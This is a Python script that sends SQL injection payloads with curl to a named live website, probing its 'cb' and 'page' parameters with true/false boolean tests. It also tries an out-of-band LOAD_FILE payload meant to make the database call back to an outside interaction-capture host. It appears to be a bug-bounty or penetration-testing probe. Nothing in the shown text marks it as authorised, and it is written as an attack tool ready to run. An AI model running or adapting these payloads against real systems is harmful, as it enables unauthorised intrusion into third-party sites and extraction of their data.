import subprocess, time, sys, uuid, os

B = "https://www.infinitycapital.bh"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

def req(url, extra=None, outfile=None):
    outfile = outfile or ("/tmp/bb_" + uuid.uuid4().hex[:8])
    args = ["curl","-sk","--max-time","30","-o",outfile,"-w","%{http_code}|%{size_download}|%{time_total}",
            "-A",UA]
    if extra: args += extra
    args.append(url)
    p = subprocess.run(args, capture_output=True, text=True)
    try: body = open(outfile,"rb").read()
    except Exception: body = b""
    os.unlink(outfile) if os.path.exists(outfile) else None
    return p.stdout, body

def show(name, url, extra=None, grep=None):
    meta, body = req(url, extra)
    hit = ""
    if grep:
        g = grep.encode() if isinstance(grep,str) else grep
        hit = " ***MATCH***" if g in body else ""
    print(f"{name:24s} {meta:26s} len={len(body)}{hit}")
    return body

if __name__ == "__main__":
    import urllib.parse
    q = lambda v: urllib.parse.quote(v, safe="")
    CB = "oob619eb5bdf5ad.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
    PG = "oobbd51fd1f6f3d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

    tests = [
        ("contact cb baseline", B+"/contact?cb=1", None, "CB1"),
        ("contact cb sqli T",   B+"/contact?cb="+q("1' AND '1'='1"), None, "CB1"),
        ("contact cb sqli F",   B+"/contact?cb="+q("1' AND '1'='2"), None, "CB1"),
        ("home page baseline", B+"/?page=2", None, None),
        ("home page sqli T",   B+"/?page="+q("2 AND 1=1"), None, None),
        ("home page sqli F",   B+"/?page="+q("2 AND 1=2"), None, None),
        ("contact cb oob",     B+"/contact?cb="+q("1' AND LOAD_FILE(0x2f2f"+CB[0:8].encode().hex()+")-- -"), None, "CB1"),
    ]
    for n,u,e,g in tests:
        show(n,u,e,g); time.sleep(6)
